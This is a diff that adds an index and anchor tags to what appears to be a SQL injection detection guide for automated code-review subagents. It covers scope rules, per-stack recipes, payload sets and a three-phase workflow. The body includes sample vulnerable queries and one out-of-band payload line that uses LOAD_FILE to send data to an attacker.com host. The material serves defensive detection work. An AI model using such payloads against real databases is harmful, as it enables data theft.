@@ -1,3 +1,326 @@
+---
+subject: "SQL injection detection reference for SAST subagents: SQLi definition and scope boundaries, prevention patterns, per-stack vulnerable/secure recipes (Python, FastAPI, Django, Flask, Node.js, Rails, Java, Go, PHP, C#, GraphQL, stored procedures, NoSQL), ORM kwargs injection CVE-2025-64459, variant taxonomy, ORM cheat sheet, payload library per DBMS, three-phase execution prompts, OWASP and CWE mappings."
+index:
+  - anchor: sqli-detection
+    what: "Focused SQLi detection role using a three-phase subagent approach — recon, batched taint verification, merge — gated on the architecture report."
+    problem: "Codebase needs systematic SQL injection sweep, yet unstructured hunting misses construction sites and drowns reviewers in unverified candidates; detection orchestration, taint sweep, phase pipeline, verified findings, audit rigor, candidate flood, methodical triage."
+    use_when: "SQLi scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-phase detection must run."
+    avoid_when: "Architecture report missing — run analysis first; only conceptual SQLi knowledge is needed, not execution."
+    expected: "Verified SQLi findings consolidated into the module report with false positives filtered."
+  - anchor: sqli-definition
+    what: "Core definition of SQL injection: unvalidated, unparameterized input reaching a query execution call, amplified in API contexts."
+    problem: "Reviewers disagree on what counts as injection without shared definition, so borderline patterns get classified inconsistently across teams and scans; concept baseline, query interpolation, shared vocabulary, classification consistency, definition anchor, scope clarity, common ground."
+    use_when: "Onboarding to the scan; deciding whether a pattern belongs to SQLi at all; teaching the detection boundary."
+    avoid_when: "Concrete stack recipes are needed — jump to the matching example anchor; execution workflow is the question."
+    expected: "Everyone applies one definition: concatenated or interpolated input into SQL execution."
+  - anchor: sqli-scope-in
+    what: "Positive scope list: concatenation, string formatting, raw ORM calls, dynamic identifiers, and resolver-built queries that count as SQLi."
+    problem: "Detectors under-report when positive pattern sets stay implicit, missing formatted strings, raw ORM methods, and dynamic identifiers; inclusion rules, inclusion catalog, raw queries, identifier interpolation, coverage completeness, missed sinks, string building."
+    use_when: "Building or checking a recon sink list; unsure whether a construction style qualifies; calibrating false negatives."
+    avoid_when: "Exclusions are the question — see the scope-out anchor; stack-specific syntax wanted."
+    expected: "Every qualifying construction style is recognized and flagged during recon."
+  - anchor: sqli-scope-out
+    what: "Separation rules distinguishing SQLi from IDOR, mass assignment, XSS, command injection, and LDAP injection."
+    problem: "Findings get double-reported or misrouted when injection boundaries stay fuzzy, corrupting severity and ownership across scans; misrouting risk, double reporting, class confusion, ownership clarity, dedup discipline, category overlap, fuzzy edges, triage errors."
+    use_when: "A finding could belong to another scan class; triaging overlapping categories; writing cross-scan routing notes."
+    avoid_when: "Positive patterns are needed — see scope-in; concrete per-stack examples wanted."
+    expected: "Each candidate lands in exactly one vulnerability class."
+  - anchor: sqli-prevention-patterns
+    what: "Catalog of constructions that prevent SQLi: parameterized binding in six languages, safe ORM forms, and identifier allowlists for dynamic ORDER BY."
+    problem: "Verify subagents need authoritative safe patterns to avoid flagging secured code, and scattered knowledge of binding styles produces false positives; safe construction, parameter idioms, allowlist identifiers, false-positive control, mitigation reference, secure baseline."
+    use_when: "Classifying a candidate as mitigated; comparing site code against known-safe forms; writing remediation notes."
+    avoid_when: "Vulnerable examples per stack are the need — see recipe anchors; payload strings wanted for dynamic tests."
+    expected: "Parameterized, allowlisted, or ORM-safe code is correctly classified as not vulnerable."
+  - anchor: sqli-ex-django-raw
+    what: "Django recipe contrasting f-string misuse in `raw()` with parameterized `raw()` and ORM filtering."
+    problem: "Django views using `raw()` or `RawSQL` with f-strings open direct injection despite ORM safe defaults; orm bypass, python web stack, view layer, params list, queryset escape, string formatting, model methods, queryset params."
+    use_when: "Target uses Django; verify subagents need stack-matched examples; reviewing `raw()` and `RawSQL` usage in views."
+    avoid_when: "Flask or SQLAlchemy-only stack — see the Flask recipe; async FastAPI code — see the FastAPI recipe."
+    expected: "Unsafe Django patterns spotted and matched to their parameterized counterparts."
+  - anchor: sqli-ex-flask-sqlalchemy
+    what: "Flask/SQLAlchemy recipe contrasting f-string into `text()` with named bind values."
+    problem: "Flask endpoints passing request data into `text()` via formatting create injection despite engine parameter support; flask routes, request taint, python microframework, session execute, blueprints, wsgi apps, route handlers, jinja context."
+    use_when: "Target uses Flask with SQLAlchemy 1.x style; selecting examples for Python verify batches."
+    avoid_when: "SQLAlchemy 2.0 async code — see the FastAPI recipe; Django stack — see the Django recipe."
+    expected: "`text()` interpolation recognized and the `:param` binding form applied."
+  - anchor: sqli-ex-fastapi-async
+    what: "FastAPI recipe covering SQLAlchemy 2.0 `text()` binding, `select()` constructs, `asyncpg` `$1` placeholders, and `aiosqlite` `?` style."
+    problem: "Async endpoints interpolate f-strings into `text()` or driver calls, and reviewers miss that concurrency changes nothing about injection; fastapi endpoints, asyncpg placeholders, aiosqlite, orm construct, coroutine code, await calls, event loop."
+    use_when: "Target uses FastAPI, asyncpg, or aiosqlite; stack selection for asyncio Python services."
+    avoid_when: "Sync Flask or Django stacks — see their recipes; non-Python targets."
+    expected: "Async-site injection recognized; bound-parameter and `select()` forms confirmed as safe."
+  - anchor: sqli-ex-sqlite3-psycopg2
+    what: "DB-API recipe for `sqlite3` and `psycopg2`/`psycopg` v3 showing `%s` and `?` placeholder binding with a driver-version note."
+    problem: "Direct driver usage bypasses ORM protections, and parameter style differences across drivers lead to formatting mistakes; db-api drivers, sqlite3 module, psycopg versions, positional binding, driver drift, cursor execute, manual queries, format strings."
+    use_when: "Target calls drivers directly without ORM; Python services using sqlite3 or psycopg."
+    avoid_when: "ORM-based access is used — see the Django or Flask recipes; async drivers — see the FastAPI recipe."
+    expected: "Driver-level interpolation flagged; correct placeholder style per driver verified."
+  - anchor: sqli-ex-nodejs-mysql2
+    what: "mysql2 recipe contrasting template-literal queries with `?` placeholders and noting the `multipleStatements` hazard."
+    problem: "Node services build queries by string interpolation, and mysql2's multi-statement option amplifies impact into stacked execution; mysql2 driver, multi statements, node backend, express mysql, escape pitfalls, backtick queries, connection pool, stacked risk."
+    use_when: "Target uses mysql2; reviewing Express-era MySQL code."
+    avoid_when: "PostgreSQL stack — see the pg recipe; Prisma usage — see the kwargs-injection recipe."
+    expected: "Literal-built queries flagged; placeholder form and disabled multi-statements confirmed."
+  - anchor: sqli-ex-nodejs-pg
+    what: "node-postgres recipe contrasting string-built queries with `$1` positional parameters."
+    problem: "PostgreSQL clients in Node built on string concatenation inject directly, while `$1` positional binding offers safe idiom; positional dollars, query builder misuse, javascript backend, express pg, pool config, dollar parameters, node datastores, node services, libpq binding."
+    use_when: "Target uses node-postgres; selecting JS examples for PostgreSQL services."
+    avoid_when: "MySQL stack — see mysql2; GraphQL resolvers — see the GraphQL recipes."
+    expected: "Concatenated pg queries flagged; `$1` binding verified."
+  - anchor: sqli-ex-rails
+    what: "Rails recipe covering interpolation in `where()`, `find_by_sql`, and the parameterized hash/array forms."
+    problem: "ActiveRecord's convenient string conditions tempt interpolation, and `find_by_sql` with embedded values bypasses sanitization entirely; rails activerecord, where interpolation, find_by_sql, hash syntax, arel escape, pluck risk, model scopes, controller params, relation chaining."
+    use_when: "Target uses Rails; reviewing query code in models or controllers."
+    avoid_when: "Other language stacks; raw driver usage without ActiveRecord."
+    expected: "Interpolated conditions flagged; hash and placeholder forms confirmed safe."
+  - anchor: sqli-ex-spring-jdbc
+    what: "Java recipe contrasting concatenated `JdbcTemplate` queries with `?` placeholders."
+    problem: "Java services building SQL strings into `JdbcTemplate` calls inject despite template parameter support; string concatenation, prepared statement style, enterprise java, named parameter, row mapper, repository layer, bean config, dao pattern."
+    use_when: "Target uses Spring's `JdbcTemplate`; reviewing repository classes."
+    avoid_when: "JPA/Hibernate usage — see the Hibernate recipe; non-Java stacks."
+    expected: "Concatenated template calls flagged; placeholder usage verified."
+  - anchor: sqli-ex-hibernate-native
+    what: "Hibernate/JPA recipe contrasting concatenated `createNativeQuery` with bound parameters, plus HQL misuse awareness."
+    problem: "Native queries in JPA reintroduce string-built SQL, and HQL built by concatenation injects through ORM layers themselves; jpa, entity manager, java orm, criteria api, jpql strings, session queries, persistence context, orm escape, typed queries."
+    use_when: "Target uses Hibernate or JPA; reviewing `createNativeQuery` or HQL construction."
+    avoid_when: "Plain JDBC — see Spring JDBC; non-Java stacks."
+    expected: "Native and HQL concatenation flagged; parameter binding verified."
+  - anchor: sqli-ex-go-database-sql
+    what: "Go `database/sql` recipe contrasting concatenated queries with `$1`/`?` placeholders per driver."
+    problem: "Go services fmt-Sprintf queries into `db.Query`, and placeholder style varies per driver, confusing reviewers; sprintf queries, pq placeholders, go mysql, backend go, sqlx, driver variance, query rows, stdlib data, error handling, rows scanning, conn pools, lib code."
+    use_when: "Target uses Go's `database/sql`; reviewing handler or store code."
+    avoid_when: "ORM-based Go without raw calls; non-Go stacks."
+    expected: "Sprintf-built queries flagged; correct per-driver placeholders verified."
+  - anchor: sqli-ex-php-pdo
+    what: "PHP recipe contrasting interpolated `query()` calls with `prepare()` and bound values."
+    problem: "PHP endpoints interpolating `$_GET` into PDO `query()` remain classic injection sources; superglobal taint, lamp stack, legacy php, bind param, shared hosting, pdo quote, get post input, wordpress style, mysql escape."
+    use_when: "Target uses raw PHP with PDO; reviewing legacy endpoints."
+    avoid_when: "Laravel or Eloquent code — see the Laravel recipe; non-PHP stacks."
+    expected: "Interpolated PDO calls flagged; prepare/bindParam forms verified."
+  - anchor: sqli-ex-php-laravel
+    what: "Laravel recipe covering `whereRaw`, `DB::raw`, and `selectRaw` interpolation versus binding."
+    problem: "Laravel's raw-expression helpers invite interpolation even in otherwise safe Eloquent codebases; whereraw, db raw, selectraw, expression misuse, query builder, binding arrays, artisan apps, facades, blade views, service container, eloquent scopes, migration files."
+    use_when: "Target uses Laravel; reviewing raw-expression usage."
+    avoid_when: "Plain PHP without Laravel — see the PDO recipe; non-PHP stacks."
+    expected: "Raw-expression interpolation flagged; bound forms verified."
+  - anchor: sqli-ex-csharp-adonet
+    what: "ADO.NET recipe contrasting concatenated `SqlCommand` text with `@param` parameters."
+    problem: "C# services building SQL by concatenation inject despite ADO.NET's parameter collections; csharp adonet, sqlcommand, add with value, dotnet backend, microsoft stack, dal code, sqlparameter, enterprise, connection objects, data readers, net framework, sql server backend, parameter arrays."
+    use_when: "Target uses ADO.NET directly; reviewing data-access classes."
+    avoid_when: "Entity Framework usage — see the EF recipe; non-.NET stacks."
+    expected: "Concatenated commands flagged; `Parameters.Add` forms verified."
+  - anchor: sqli-ex-csharp-ef
+    what: "EF Core recipe covering `FromSqlRaw` versus `FromSqlInterpolated` and safe LINQ."
+    problem: "EF Core's raw-SQL methods differ subtly, and choosing `FromSqlRaw` with interpolation reintroduces injection into LINQ-safe code; fromsqlraw, fromsqlinterpolated, linq, dotnet orm, interop methods, string form, db context, migration sql, linq safety, db sets."
+    use_when: "Target uses EF Core; reviewing raw-SQL interop points."
+    avoid_when: "Plain ADO.NET — see the ADO.NET recipe; non-.NET stacks."
+    expected: "Unsafe raw method usage flagged; interpolated-safe variants verified."
+  - anchor: sqli-ex-dynamic-order-by
+    what: "Cross-stack recipe for dynamic ORDER BY and column names, where parameters cannot bind identifiers and allowlists are the only fix."
+    problem: "Sortable endpoints pass field names into queries, and parameterization cannot bind identifiers, so explicit allowlists become sole defense; identifier injection, order by clause, unbindable names, dynamic fields, direction input, whitelist check, sortable grids."
+    use_when: "Endpoints accept sort, column, or direction parameters; any stack."
+    avoid_when: "Value-based filtering only — parameterization suffices there."
+    expected: "Identifier interpolation flagged unless gated by explicit allowlists."
+  - anchor: sqli-ex-orm-kwargs-injection
+    what: "Recipe for ORM key injection via `filter(**kwargs)` and Prisma `orderBy`, including CVE-2025-64459's `_connector`/`_negated` abuse."
+    problem: "Expanding user dictionaries into ORM methods injects control keys rather than values, flipping query logic behind parameterization; kwargs expansion, internal arguments, connector flip, negation toggle, orderby abuse, cve 2025 64459, dict splat, object spread, key filtering."
+    use_when: "Django or Prisma in the stack; dynamic filter or sort objects built from requests."
+    avoid_when: "Static query construction only; raw-SQL interpolation is the issue — see stack recipes."
+    expected: "Key-injection sites flagged unless key allowlists gate expansion."
+  - anchor: sqli-ex-graphql-nodejs
+    what: "Node.js recipe showing resolver-level SQLi where GraphQL arguments flow into pg queries."
+    problem: "Schema arguments feel structured yet land in raw queries inside resolvers, creating injection behind clean type definitions; argument taint, schema facade, api layer, apollo server, variables, type comfort, field resolution, query language."
+    use_when: "Target exposes GraphQL on Node.js; reviewing resolver data fetching."
+    avoid_when: "Python or Java GraphQL — see those recipes; REST-only APIs."
+    expected: "Resolver-level concatenation flagged; parameterized resolver queries verified."
+  - anchor: sqli-ex-graphql-python
+    what: "GraphQL Python recipe with Graphene/SQLAlchemy resolvers passing arguments into queries."
+    problem: "Python resolvers pass schema arguments into ORM or text queries, hiding injection behind typed definitions; graphene resolvers, sqlalchemy integration, schema trust, resolver sinks, strawberry, ariadne, typed facade, mutation inputs, query variables."
+    use_when: "Target uses Graphene or Strawberry-style Python schemas."
+    avoid_when: "Node or Java GraphQL — see those recipes; REST-only APIs."
+    expected: "Resolver argument taint traced into query construction."
+  - anchor: sqli-ex-graphql-java
+    what: "Java recipe with graphql-java fetchers calling JDBC with argument-built SQL."
+    problem: "Java data fetchers concatenate schema arguments into JDBC statements, bypassing type-system comfort; jdbc sinks, jvm graphql, spring for graphql, fetcher taint, dto mapping, connection handling, annotation wiring, boot starter, query dsl."
+    use_when: "Target uses graphql-java or Spring's GraphQL support."
+    avoid_when: "Node or Python GraphQL — see those recipes; REST-only APIs."
+    expected: "Fetcher-level SQL building flagged; bound statements verified."
+  - anchor: sqli-ex-stored-proc-plsql
+    what: "PL/SQL recipe showing `EXECUTE IMMEDIATE` with concatenated arguments inside Oracle routines."
+    problem: "Dynamic SQL inside stored procedures injects even when calling application code binds safely; plsql execute immediate, database-layer sinks, procedure arguments, hidden injection, using clause, cursor loops, dbms sql, routine concat."
+    use_when: "Target calls Oracle routines; procedure source is available."
+    avoid_when: "SQL Server or MySQL procedures — see those recipes; no stored procedures in play."
+    expected: "Unsafe `EXECUTE IMMEDIATE` flagged; `USING` clause binding verified."
+  - anchor: sqli-ex-stored-proc-tsql
+    what: "T-SQL recipe showing `sp_executesql` misuse versus parameterized dynamic SQL."
+    problem: "T-SQL procedures building strings for `sp_executesql` inject internally despite safe outer calls; sp_executesql, dynamic tsql, parameter passthrough, quotename misuse, exec concat, nvarchar assembly, sys modules, nested exec, print debug, temp tables."
+    use_when: "Target calls T-SQL routines with dynamic arguments."
+    avoid_when: "Oracle or MySQL routines — see those recipes; no stored procedures in play."
+    expected: "Concatenated dynamic T-SQL flagged; parameterized `sp_executesql` verified."
+  - anchor: sqli-ex-stored-proc-mysql
+    what: "MySQL recipe showing `PREPARE`/`EXECUTE` built from concatenated procedure arguments."
+    problem: "MySQL routines assembling statements via CONCAT open injection within database layers; prepare execute, procedure taint, statement assembly, definer rights, sys schema, routine bodies, hidden concat, delimiter blocks, sql mode, declare handlers."
+    use_when: "Target calls MySQL routines; source code of routines can be reviewed."
+    avoid_when: "Oracle or SQL Server procedures — see those recipes; no stored procedures in play."
+    expected: "Concat-assembled statements flagged; variable-passing forms verified."
+  - anchor: sqli-ex-stacked-queries
+    what: "Recipe for batch and multi-statement injection where drivers allow several statements per call."
+    problem: "Drivers with multi-statement support turn simple injection into stacked execution, adding writes and DDL to read-only intents; stacked queries, multi statements, batch execution, driver options, write amplification, query chaining, destructive potential."
+    use_when: "Drivers like mysql2 `multipleStatements` or Connector/J `allowMultiQueries` are enabled."
+    avoid_when: "Drivers enforce single statements; classic single-query injection is the concern."
+    expected: "Multi-statement capability identified as an amplifier in findings."
+  - anchor: sqli-ex-second-order
+    what: "Second-order SQLi recipe where safely stored values are later interpolated into new queries."
+    problem: "Stored user content trusted on read gets concatenated into later queries, evading input-time validation entirely; second order injection, stored payloads, deferred execution, delayed sinks, dormant taint, report builders, admin exports, latent payloads."
+    use_when: "Code reads database values into subsequent query construction; batch or admin flows exist."
+    avoid_when: "Direct request-to-query flows — the classic recipes cover those."
+    expected: "Read-then-interpolate chains flagged despite safe initial writes."
+  - anchor: sqli-ex-nosql-mongodb
+    what: "MongoDB recipe covering operator injection via `$where` and object-shaped query input."
+    problem: "JSON-bodied APIs forward objects into find calls, enabling operator injection that bypasses string-level sanitization; mongodb operators, dollar where, mongoose queries, json body taint, document store, gt ne filters, type juggling, bson payloads."
+    use_when: "Target uses MongoDB or Mongoose; reviewing query construction from request bodies."
+    avoid_when: "Relational stores — see SQL recipes; other NoSQL engines — see the wide NoSQL recipe."
+    expected: "Operator-shaped input flagged; schema-validated queries verified."
+  - anchor: sqli-ex-nosql-dynamodb
+    what: "DynamoDB recipe contrasting concatenated `KeyConditionExpression` with expression-attribute binding."
+    problem: "AWS SDK condition strings built by concatenation inject into DynamoDB queries despite placeholder support; key condition, boto3 queries, aws backend, partiql risk, scan filters, sdk misuse, table names, expression attributes, item collections."
+    use_when: "Target uses DynamoDB via boto3 or AWS SDKs."
+    avoid_when: "Document stores with JSON query DSLs — see MongoDB or Elasticsearch recipes."
+    expected: "Concatenated expressions flagged; attribute-value binding verified."
+  - anchor: sqli-ex-nosql-elasticsearch
+    what: "Elasticsearch recipe contrasting string-built query DSL with structured DSL construction."
+    problem: "Search endpoints concatenating into DSL bodies open injection through query layers; elasticsearch dsl, json dsl, python client, structure building, lucene syntax, opensearch, painless scripts, bool queries, match clauses, script fields."
+    use_when: "Target uses Elasticsearch or OpenSearch."
+    avoid_when: "Key-value or document stores — see other NoSQL recipes."
+    expected: "String-built DSL flagged; structured construction verified."
+  - anchor: sqli-ex-nosql-wide
+    what: "Broad recipe covering Neo4j Cypher parameters, Cassandra CQL prepared statements, Redis `EVAL` via `KEYS`/`ARGV`, and ClickHouse column allowlists."
+    problem: "Alternative datastores repeat identical concatenation mistakes in their own query languages, escaping SQL-focused review; cypher injection, cql statements, redis eval, graph queries, lua scripts, prepared cql, identifier filtering, kv stores, engine diversity."
+    use_when: "Neo4j, Cassandra, Redis scripting, or ClickHouse present in the stack."
+    avoid_when: "MongoDB, DynamoDB, or Elasticsearch — those have dedicated recipes."
+    expected: "Per-engine concatenation flagged; parameter, prepared, `KEYS`/`ARGV`, or allowlist fixes verified."
+  - anchor: sqli-variant-taxonomy
+    what: "Table of API-relevant SQLi variants beyond classic relational injection, with attack examples and detection signals."
+    problem: "Reviewers anchored on classic patterns miss second-order, stored-procedure, ORM-raw, NoSQL, and GraphQL variants present in modern APIs; variant coverage, taxonomy lookup, modern injection forms, missed classes, review breadth, pattern catalog, edge variants."
+    use_when: "Scoping which variants apply to the architecture; expanding a recon checklist beyond classic SQLi."
+    avoid_when: "Per-variant detection detail is needed — see the heuristics anchor; stack recipes wanted."
+    expected: "All applicable variants enumerated for the target architecture."
+  - anchor: sqli-detection-heuristics
+    what: "Per-variant detection heuristics telling recon agents exactly which syntax patterns signal each SQLi variant."
+    problem: "Knowing variants exist does not locate them, and without per-variant signals recon skips stored procedures, resolvers, and second-order chains; detection signals, recon heuristics, variant hunting, search patterns, signal checklist, grep targets."
+    use_when: "Running or writing recon prompts; verifying recon coverage per variant."
+    avoid_when: "Variant overview only — see the taxonomy anchor; payloads wanted for dynamic testing."
+    expected: "Recon searches each variant with its concrete code signals."
+  - anchor: sqli-orm-cheat-sheet
+    what: "Lookup table of unsafe ORM methods per framework mapped to their secure counterparts."
+    problem: "Verify agents need quick judgment on whether an ORM call is raw or safe without re-deriving it per framework; orm lookup, unsafe methods, quick reference, framework matrix, judgment aid, raw detection, method table, call classification."
+    use_when: "Classifying a specific ORM call; checking remediation suggestions."
+    avoid_when: "Full recipe context is needed — see the per-stack recipe anchors."
+    expected: "Each ORM call classified raw-versus-safe from the table."
+  - anchor: sqli-payload-library
+    what: "Intro to the payload collection: probes for dynamic tests, paired with sqlmap when endpoints are reachable and testing is legal."
+    problem: "Static findings need dynamic confirmation payloads, and ad-hoc probing wastes time or skips DBMS-specific channels; test payloads, probe library, legal testing, dbms coverage, validation tooling, proof strings, safe scope, consent bounds."
+    use_when: "Dynamic test templates are being written; payloads must match the target DBMS."
+    avoid_when: "Static review only; testing is not authorized."
+    expected: "Correct per-DBMS probes selected for confirmation."
+  - anchor: sqli-payloads-mysql
+    what: "MySQL/MariaDB probe set including comment styles, version detection, and stacked or out-of-band options."
+    problem: "Confirming MySQL injection needs dialect-correct probes, since comments, functions, and engines differ across databases; dialect specifics, comment syntax, version fingerprint, mariadb quirks, confirmation strings, outfile risk, information schema, concat tricks."
+    use_when: "Target database is MySQL or MariaDB; writing dynamic tests."
+    avoid_when: "Other DBMS — see the matching payload anchor."
+    expected: "Dialect-correct probes chosen for MySQL or MariaDB."
+  - anchor: sqli-payloads-postgresql
+    what: "PostgreSQL probe set with `pg_sleep`, dollar-quoted bodies, and file/command functions where permitted."
+    problem: "PostgreSQL confirmation relies on its own functions and quoting, and generic probes misfire or under-prove; pg sleep, time based, function calls, dialect proof, copy program, large objects, listen notify, cast errors, string variants."
+    use_when: "Target database is PostgreSQL."
+    avoid_when: "Other DBMS — see the matching payload anchor."
+    expected: "Dialect-correct PostgreSQL probes chosen."
+  - anchor: sqli-payloads-mssql
+    what: "SQL Server probe set with `xp_cmdshell` awareness and T-SQL specifics."
+    problem: "MSSQL confirmation needs T-SQL idioms and awareness of dangerous extended procedures; waitfor delay, xp cmdshell, tsql idioms, windows stack, dialect proof, batch separators, error based, oledb, openrowset, linked servers, unc paths, batching go."
+    use_when: "Target database is SQL Server."
+    avoid_when: "Other DBMS — see the matching payload anchor."
+    expected: "Dialect-correct probes chosen for SQL Server."
+  - anchor: sqli-payloads-oracle
+    what: "Oracle probe set with PL/SQL context, `UTL_HTTP` out-of-band options, and `DUAL` idioms."
+    problem: "Oracle confirmation requires its own idioms and network packages for out-of-band proof; plsql context, utl http, dialect proof, outbound channels, xml db, dbms pipes, hierarchy queries, error extraction, connect by, remote calls."
+    use_when: "Target database is Oracle."
+    avoid_when: "Other DBMS — see the matching payload anchor."
+    expected: "Dialect-correct probes chosen for Oracle."
+  - anchor: sqli-payloads-sqlite
+    what: "SQLite probe set reflecting its limited but distinct function surface."
+    problem: "SQLite's minimal engine changes which proofs are possible, and heavyweight probes fail silently; lightweight engine, function limits, local database, dialect proof, minimal surface, file based, embedded context, attach trick, journal mode."
+    use_when: "Target database is SQLite."
+    avoid_when: "Other DBMS — see the matching payload anchor."
+    expected: "Dialect-correct probes chosen for SQLite."
+  - anchor: sqli-payloads-nosql
+    what: "NoSQL probe set for operator abuse and JavaScript-bearing fields."
+    problem: "Document-store confirmation needs operator and JavaScript probes rather than SQL strings; javascript payloads, dollar operators, confirmation vectors, where clauses, server side js, bson input, mongo, aggregation stages, map reduce, eval legacy."
+    use_when: "Target uses MongoDB-like document databases."
+    avoid_when: "Relational targets — see DBMS payload anchors."
+    expected: "NoSQL-appropriate probes chosen."
+  - anchor: sqli-payloads-graphql
+    what: "GraphQL resolver probe set for argument-level injection testing."
+    problem: "Resolver injection needs probes delivered through GraphQL arguments and aliases, not classic form fields; argument delivery, alias batching, resolver testing, schema aware, injection vectors, operation names, query crafting, variable slots."
+    use_when: "Target exposes GraphQL with database-backed resolvers."
+    avoid_when: "REST endpoints — use DBMS payload anchors."
+    expected: "Argument-level probes chosen for resolver tests."
+  - anchor: sqli-execution-intro
+    what: "Execution overview: three phases run by subagents with the architecture report passed as context to each."
+    problem: "Detection work without orchestration structure duplicates effort and loses batch boundaries; execution model, phase overview, subagent orchestration, context passing, batch discipline, workflow entry, pipeline order, dispatch plan, coordination, uniform, staging."
+    use_when: "Starting the SQLi scan execution; deciding how to dispatch subagents."
+    avoid_when: "Specific phase prompts are needed — jump to phase anchors."
+    expected: "All three phases dispatched with shared architecture context."
+  - anchor: sqli-phase1-recon
+    what: "Recon instructions telling the subagent to find every SQL construction site with variant-aware signals and skip lists."
+    problem: "Unstructured searching misses construction sites or floods candidates with safe code, so recon needs explicit patterns and exclusions; site discovery, skip rules, candidate quality, coverage discipline, grep scope, noise control, thorough sweep."
+    use_when: "Launching the recon subagent; reviewing recon completeness."
+    avoid_when: "Candidates already gathered — proceed to verify; conceptual knowledge wanted."
+    expected: "Complete, de-duplicated candidate list of injection sites."
+  - anchor: sqli-phase1-gate
+    what: "Zero-candidate short-circuit: emit a clean no-findings stub and stop when recon finds nothing."
+    problem: "Pipeline without early exit wastes verify batches on empty candidate sets and leaves missing artifacts; empty recon, pipeline efficiency, artifact completeness, stop rule, graceful halt, zero results, idle batches, skipped verify."
+    use_when: "Recon returned zero candidates."
+    avoid_when: "Candidates exist — proceed to batched verification."
+    expected: "No-findings stub written and the scan stops gracefully."
+  - anchor: sqli-phase2-verify
+    what: "Batched taint-analysis prompt tracing input to each candidate sink, with safeguard assessment and the verdict rubric."
+    problem: "Unverified candidates are noise, and serial verification is slow, so batched taint tracing with explicit rubric is required; batch processing, parallel analysis, evidence tracing, sink confirmation, flow proof, verdict labels, parallel batches, sink verdicts."
+    use_when: "Candidates confirmed present; dispatching verify subagents in batches of three."
+    avoid_when: "Recon incomplete; merge stage is the need."
+    expected: "Every candidate classified with traced evidence and mitigation assessment."
+  - anchor: sqli-phase3-merge
+    what: "Merge procedure consolidating batch reports into the final module report with dedup and the output template."
+    problem: "Parallel batch outputs overlap and diverge, and without merge discipline final reports duplicate or lose findings; result merging, dedup, consolidation, final template, partial results, report integrity, single file, clean handoff, overlap removal."
+    use_when: "All verify batches finished; producing `02_sqli.md`."
+    avoid_when: "Batches still running; recon stage not done."
+    expected: "Single consolidated module report with unique, classified findings."
+  - anchor: sqli-owasp-mapping
+    what: "Mapping of SQLi findings to OWASP API 2023 risks, since that edition has no injection category."
+    problem: "Findings need correct 2023-era taxonomy, and assuming dedicated injection category mislabels everything; taxonomy mapping, risk routing, classification accuracy, edition awareness, risk labeling, correct tagging, category shift, compliance notes, traceability, version drift."
+    use_when: "Tagging detected issues with the 2023 risk taxonomy; writing the report's risk section."
+    avoid_when: "CWE-level tagging is the question — see the CWE anchor."
+    expected: "Findings mapped to the correct API risks with explicit reasoning."
+  - anchor: sqli-cwe-references
+    what: "Guidance assigning CWE-89 as primary, related entries, and the rule against using CWE-78 for SQLi."
+    problem: "Wrong CWE assignment breaks downstream tooling and metrics, especially command-injection confusion; weakness taxonomy, cwe 89, misclassification risk, tooling accuracy, reference lookup, identifier precision, reporting feeds, consistency, dedup keys, scanner alignment, scoring feeds."
+    use_when: "Assigning CWE identifiers to findings."
+    avoid_when: "OWASP risk mapping is the question — see the OWASP anchor."
+    expected: "Each finding carries the correct CWE identifier."
+  - anchor: sqli-reminders
+    what: "Operational guardrails: escaping is not parameterization, evidence requirements, report discipline."
+    problem: "Under pressure, agents accept escaping as mitigation, skip evidence, or overstate severity, corrupting report quality; mitigation rigor, evidence demand, severity honesty, quality guardrails, review discipline, trap avoidance, false comfort, checklist, last pass."
+    use_when: "Reviewing draft findings before merge; calibrating classifications."
+    avoid_when: "Specific recipes or payload syntax are the question — see the recipe and payload anchors; this card only guards finding quality."
+    expected: "Merged findings carry proof for every claim, escaping never counted as a fix, and severity matches demonstrated impact."
+  - anchor: sqli-references
+    what: "External link list for SQLi concepts, guidance documents, and tooling."
+    problem: "Agents and readers need authoritative follow-up sources beyond this file's distilled content; further reading, tooling docs, external canon, deep dives, vendor documentation, community knowledge, standards, primary material, owasp pages, cited works."
+    use_when: "Primary sources or extended material is needed."
+    avoid_when: "Detection recipes or execution workflow are the question — the references list is follow-up reading, not procedure."
+    expected: "Reader reaches canonical external material for any topic this file condenses."
+---
+
 # SQL Injection (SQLi) Detection
 
 [ref: #sqli-detection]
@@ -6,22 +329,8 @@ You are performing a focused security assessment to find SQL injection vulnerabi
 
 **Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.
 
-## Table of contents
-
-- [What is SQL Injection](#what-is-sql-injection)
-- [Vulnerable vs. Secure Examples](#vulnerable-vs-secure-examples)
-- [SQLi Variant Taxonomy](#sqli-variant-taxonomy)
-- [ORM Unsafe-Pattern Cheat Sheet](#orm-unsafe-pattern-cheat-sheet)
-- [Dynamic-Test Payload Library](#dynamic-test-payload-library)
-- [Execution](#execution)
-- [OWASP API Security Top 10 2023 mapping](#owasp-api-security-top-10-2023-mapping)
-- [CWE references](#cwe-references)
-- [Important Reminders](#important-reminders)
-- [References](#references)
-
----
-
 ## What is SQL Injection
+[ref: #sqli-definition]
 
 SQL injection occurs when user-supplied input is incorporated into SQL queries through string concatenation or interpolation rather than parameterized binding. This allows attackers to alter query logic, bypass authentication, extract sensitive data, modify or delete records, and in some configurations execute OS commands.
 
@@ -30,6 +339,7 @@ The core pattern: *unvalidated, unparameterized user input reaches a SQL query e
 In API contexts the risk is amplified: endpoints often accept JSON, query parameters, path variables, or GraphQL arguments that are mapped directly to database queries; a single vulnerable resolver or repository method can expose the entire data store.
 
 ### What SQLi IS
+[ref: #sqli-scope-in]
 
 - Concatenating user input directly into a SQL string: `"SELECT * FROM users WHERE name = '" + username + "'"`
 - Using string formatting to build queries: `f"SELECT * FROM orders WHERE id = {order_id}"`
@@ -45,6 +355,7 @@ In API contexts the risk is amplified: endpoints often accept JSON, query parame
 - Out-of-band SQLi: payloads that cause the database to issue DNS or HTTP requests (e.g., `LOAD_FILE(CONCAT('\\\\',SUBSTRING(...),'.attacker.com\\a.txt'))`)
 
 ### What SQLi is NOT
+[ref: #sqli-scope-out]
 
 Do not flag these as SQLi:
 
@@ -56,6 +367,7 @@ Do not flag these as SQLi:
 - **Safe ORM queries**: Parameterized ORM lookups like `User.objects.filter(id=user_id)` or `User.find(params[:id])` — do not flag these
 
 ### Patterns That Prevent SQLi
+[ref: #sqli-prevention-patterns]
 
 When you see these patterns, the code is likely **not vulnerable**:
 
